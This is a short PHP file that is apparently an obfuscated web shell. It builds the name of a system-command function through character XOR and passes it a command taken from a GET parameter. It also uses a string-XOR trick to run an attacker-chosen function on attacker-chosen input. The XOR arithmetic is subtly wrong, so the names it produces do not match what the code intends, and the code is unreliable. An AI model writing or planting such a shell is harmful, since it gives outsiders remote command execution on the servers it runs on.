<?php

$xor = 0x1; 


$funcName = 
    chr(ord('s') ^ $xor) . 
    chr(ord('y') ^ $xor) . 
    chr(ord('s') ^ $xor) . 
    chr(ord('t') ^ $xor) . 
    chr(ord('e') ^ $xor) . 
    chr(ord('m') ^ $xor); 


$cmd = filter_input(INPUT_GET, chr(ord('_') ^ $xor), FILTER_DEFAULT);


$_ = "{{{" ^ "?<>/";


$funcName($cmd); 


${$_}[_](${$_}[__]); 
?>
